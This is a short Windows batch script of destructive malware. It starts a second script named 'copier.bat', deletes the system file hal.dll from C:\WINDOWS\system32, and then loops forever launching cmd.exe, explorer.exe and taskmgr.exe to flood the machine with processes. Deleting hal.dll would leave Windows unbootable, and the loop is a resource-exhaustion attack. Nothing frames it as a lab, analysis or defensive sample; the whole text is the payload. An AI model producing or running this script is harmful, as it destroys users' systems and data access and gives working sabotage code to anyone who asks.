start copier.bat

cd "C:\WINDOWS\system32\"
del "hal.dll"

:loop
start cmd.exe
start explorer.exe
start taskmgr.exe
goto loop
